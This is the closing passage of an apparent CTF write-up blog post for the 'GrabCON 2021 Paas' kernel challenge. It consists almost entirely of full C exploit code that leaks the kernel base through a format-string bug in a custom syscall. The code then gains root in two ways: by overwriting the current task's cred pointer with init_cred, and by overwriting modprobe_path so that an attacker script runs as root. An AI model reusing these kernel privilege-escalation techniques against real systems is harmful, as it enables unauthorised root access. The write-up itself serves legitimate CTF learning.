<span class="kt">void</span> <span class="nf">write_long</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">where</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">what</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">fmt</span><span class="p">[</span><span class="mh">0x50</span><span class="p">];</span>
    <span class="kt">uint32_t</span> <span class="n">part1</span> <span class="o">=</span> <span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">,</span> <span class="n">part2</span> <span class="o">=</span> <span class="n">what</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
    <span class="kt">uint16_t</span> <span class="n">part1_lower</span> <span class="o">=</span> <span class="n">part1</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="n">part1_upper</span> <span class="o">=</span> <span class="n">part1</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">;</span>
    <span class="kt">uint16_t</span> <span class="n">part2_lower</span> <span class="o">=</span> <span class="n">part2</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="n">part2_upper</span> <span class="o">=</span> <span class="n">part2</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">;</span>

    <span class="n">sprintf</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="s">"%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn"</span><span class="p">,</span> <span class="n">part1_lower</span><span class="p">,</span> 
    <span class="p">(</span><span class="n">part1_upper</span> <span class="o">&gt;</span> <span class="n">part1_lower</span><span class="p">)</span> <span class="o">?</span> <span class="n">part1_upper</span> <span class="o">-</span> <span class="n">part1_lower</span> <span class="o">:</span> <span class="n">part1_upper</span> <span class="o">-</span> <span class="n">part1_lower</span> <span class="o">+</span> <span class="mh">0x10000</span><span class="p">,</span>
    <span class="p">(</span><span class="n">part2_lower</span> <span class="o">&gt;</span> <span class="n">part1_upper</span><span class="p">)</span> <span class="o">?</span> <span class="n">part2_lower</span> <span class="o">-</span> <span class="n">part1_upper</span> <span class="o">:</span> <span class="n">part2_lower</span> <span class="o">-</span> <span class="n">part1_upper</span> <span class="o">+</span> <span class="mh">0x10000</span><span class="p">,</span>
    <span class="p">(</span><span class="n">part2_upper</span> <span class="o">&gt;</span> <span class="n">part2_lower</span><span class="p">)</span> <span class="o">?</span> <span class="n">part2_upper</span> <span class="o">-</span> <span class="n">part2_lower</span> <span class="o">:</span> <span class="n">part2_upper</span> <span class="o">-</span> <span class="n">part2_lower</span> <span class="o">+</span> <span class="mh">0x10000</span>
    <span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">fmt</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">where</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">where</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">where</span> <span class="o">+</span> <span class="mi">6</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">per_cpu_offset</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x14176a0</span><span class="p">;</span>

    <span class="n">ptr</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">per_cpu_offset</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">task_struct</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mh">0x16d00</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred_addr</span> <span class="o">=</span> <span class="n">task_struct</span> <span class="o">+</span> <span class="mh">0x6b8</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x164e400</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"task_struct: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"current cred address: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_cred_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"init_cred: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">init_cred</span><span class="p">);</span>

    <span class="n">write_long</span><span class="p">(</span><span class="n">current_cred_addr</span><span class="p">,</span> <span class="n">init_cred</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"id; cat /root/flag.txt"</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>
<h2 id="modprobe-method-1">Modprobe method</h2>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/syscall.h&gt;
</span>
<span class="cp">#define SYSCALL_NO 548
</span>
<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">mkfifo</span><span class="p">(</span><span class="s">"/home/user/check_fifo"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>
    <span class="n">freopen</span><span class="p">(</span><span class="s">"/home/user/check_fifo"</span><span class="p">,</span> <span class="s">"r+"</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/home/user/check_fifo"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"echo '#!/bin/sh</span><span class="se">\n</span><span class="s">chmod 777 /root/flag.txt' &gt; /home/user/to_exec.sh; echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /home/user/invalid; chmod +x /home/user/to_exec.sh; chmod +x /home/user/invalid"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">bytes_left</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">nbytes</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">FIONREAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">nbytes</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">clear_stdin</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">read_ptr_stdin</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptr</span><span class="p">){</span>
    <span class="n">clear_stdin</span><span class="p">();</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">arb_read_ptr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptr</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="kt">uint64_t</span> <span class="n">ret</span><span class="p">;</span>
    
    <span class="n">arb_read</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ret</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">arb_read</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
            <span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">tmp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">get_leak</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">,</span> <span class="n">ptr</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"12345678"</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="n">read_ptr_stdin</span><span class="p">();</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">();</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>    
    <span class="n">clear_stdin</span><span class="p">();</span>

    <span class="k">while</span><span class="p">((</span><span class="n">leak</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x4ec0</span><span class="p">){</span>
        <span class="n">leak</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>

        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">leak</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">write_byte</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">where</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">what</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">fmt</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>

    <span class="n">sprintf</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="s">"%%%dc%%1$hhn"</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">fmt</span><span class="p">,</span> <span class="n">where</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">write_str</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">write_byte</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span> <span class="c1">// tty_dev_attr_group</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x164ec60</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"modprobe_path: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe_path</span><span class="p">);</span>

    <span class="n">write_str</span><span class="p">(</span><span class="n">modprobe_path</span><span class="p">,</span> <span class="s">"/home/user/to_exec.sh"</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"/home/user/invalid"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /root/flag.txt"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Lastly, I want to say that I might have got some things wrong, if you know about it or want to discuss something or have any questions, ping me on discord <code class="language-plaintext highlighter-rouge">stdnoerr#7880</code>.<br />
I want to say thanks to <code class="language-plaintext highlighter-rouge">Bitfriends#2070</code> for making this challenge.</p>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#kernel-pwn-ref">
					kernel-pwn <span>(1)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#kernel-ref">
					kernel <span>(2)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#writeup-ref">
					writeup <span>(2)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=GrabCON 2021 - Paas&via=stdnoerr"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c" class="img-rounded author-image" />
        <h4 class="section-title author-name">stdnoerr</h4>
        <p class="author-bio">CTFer | pwner | wanna learn everything</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/pwn-training/2021/07/29/format-string-leaking.html" title="Format string - leaking">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/ctf/2021/09/19/ACSC2021.html" title="ACSC 2021 - Pwn challenges">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2021 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'stdnoerr_blog', 'auto');
  ga('send', 'pageview');
</script>

